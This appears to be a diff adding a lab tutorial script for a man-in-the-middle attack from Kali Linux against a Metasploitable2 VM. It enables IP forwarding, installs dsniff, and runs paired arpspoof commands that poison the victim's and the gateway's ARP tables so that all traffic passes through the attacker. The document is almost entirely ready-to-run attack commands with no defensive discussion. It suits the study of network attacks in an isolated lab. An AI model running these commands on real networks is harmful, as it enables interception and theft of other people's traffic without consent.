@@ -1,0 +1,77 @@
+#############################################
+# MITM ATTACK SETUP (KALI + METASPLOITABLE)
+# Full Steps with Comments
+#############################################
+
+#############################################
+# PHASE A — Confirm Both VMs Are on Same Network
+#############################################
+
+# On Kali:
+ip a
+
+# On Metasploitable2:
+ifconfig
+
+# Expected:
+# - Kali IP: 192.168.56.x
+# - MS2 IP:  192.168.56.y
+# - Gateway: 192.168.56.1
+#
+# If both machines share the same /24 network,
+# MITM attack is possible.
+
+#############################################
+# PHASE B — Enable IP Forwarding (Required for MITM)
+#############################################
+
+# This makes your Kali forward packets between the victim and gateway.
+# Without this, the victim loses internet access during MITM.
+
+sudo sysctl -w net.ipv4.ip_forward=1
+
+#############################################
+# PHASE C — ARP SPOOFING (MITM ACTIVATION)
+#############################################
+
+# First, install ARP spoofing tools (dsniff package):
+sudo apt install dsniff -y
+
+# Identify your active network interface:
+ip link
+
+# Example interfaces:
+# - eth0
+# - ens33
+# - wlan0
+
+# Replace <interface> with your actual adapter.
+# Example here uses: eth0
+
+#############################################
+# TERMINAL 1 — Spoof the Victim
+#############################################
+
+# Tells the victim (192.168.56.102) that "I am the gateway"
+sudo arpspoof -i eth0 -t 192.168.56.102 192.168.56.1
+
+#############################################
+# TERMINAL 2 — Spoof the Gateway
+#############################################
+
+# Tells the gateway (192.168.56.1) that "I am the victim"
+sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.102
+
+#############################################
+# MITM SUCCESS CONDITION
+#############################################
+
+# When BOTH commands are running simultaneously:
+#
+# - Victim believes Kali = Gateway
+# - Gateway believes Kali = Victim
+#
+# RESULT: ALL traffic flows THROUGH your Kali.
+# You are now Man-In-The-Middle.
+#############################################
+
